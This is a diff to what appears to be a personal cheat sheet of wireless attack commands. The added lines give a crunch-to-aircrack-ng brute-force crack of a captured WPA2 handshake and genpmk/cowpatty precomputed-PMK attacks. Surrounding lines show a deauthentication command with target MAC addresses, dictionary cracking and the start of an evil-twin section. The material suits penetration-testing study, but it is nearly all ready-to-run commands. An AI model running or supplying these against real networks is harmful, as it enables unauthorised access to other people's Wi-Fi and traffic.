@@ -142,7 +142,9 @@ WEP
 			-multiple dict attack
 		aircrack-ng -z file.pcap
 WPA/WPA2-PSK
-	-only crackable by brute force
+	-crackable by brute force
+	crunch 8 8 0123456789 | aircrack-ng -e "FBI Surveilance Van" -w - /root/home/wpa2.eapol.cap
+		--pure brute force, differentiated from dictionary attack
 		
 AIRDECAP-NG
 	-decrypt WEP/WPA/WPA2 capture files, given the correct key
@@ -235,6 +237,9 @@ aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
 	Run aircrack-ng to crack the pre-shared key using the authentication handshake
 aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
 	
+PMK Attacks:
+genpmk -f list.words -d captured.hash -s <AP_ESSID>
+cowpatty -r handshake.pcap -d captured.hash -2 -s <AP_ESSID>
 
 Fake-AP (Evil Twin) Attack
 airmon-ng start wlan0
